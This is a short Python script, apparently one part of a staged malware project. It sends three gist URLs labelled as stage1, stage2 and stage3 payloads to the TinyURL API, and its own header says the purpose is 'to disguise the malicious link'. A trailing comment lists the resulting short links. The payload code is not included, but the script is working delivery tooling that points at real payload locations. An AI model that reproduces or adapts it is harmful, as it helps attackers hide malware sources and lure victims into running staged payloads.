'''
 # @ Create Time: 2025-05-09 10:10:00
 # @ Modified time: 2025-05-09 10:10:06
 # @ Description: convert long link into a short link to disguise the malicious link
 '''

import requests


stage1_payload = "https://gist.githubusercontent.com/Wapiti08/519771e3a0323b43944f20cf3fa4f0c1/raw/9359cee14831a8235054b1496e4785bb0cd29994/stage1.py"

stage2_payload = "https://gist.githubusercontent.com/Wapiti08/2f36f25fe4e639dc354a8bfd6829fa66/raw/8f9e54defbd3ecf7410fdeffcc449062a0467d21/stage2.py"

stage3_payload = "https://gist.githubusercontent.com/Wapiti08/191023b9a2e8dfe47339b8856c18c29e/raw/ad6a6394bcd397cbfe70626f00c872ca51056c83/medusa_wins.py"

api_url = "http://tinyurl.com/api-create.php"

for long_url in [stage2_payload, stage1_payload, stage3_payload]:
    response = requests.get(api_url, params={"url": long_url})
    if response.status_code == 200:
        short_url = response.text
        print(f"Shortened URL of {long_url} is:", short_url)

    else:
        print("Failed to shorten the URL. Status code:", response.status_code)


'''
# stage1: https://tinyurl.com/25cme5wt
# stage2: https://tinyurl.com/294w5nvf
# stage3: https://tinyurl.com/2a2s6zqt
'''
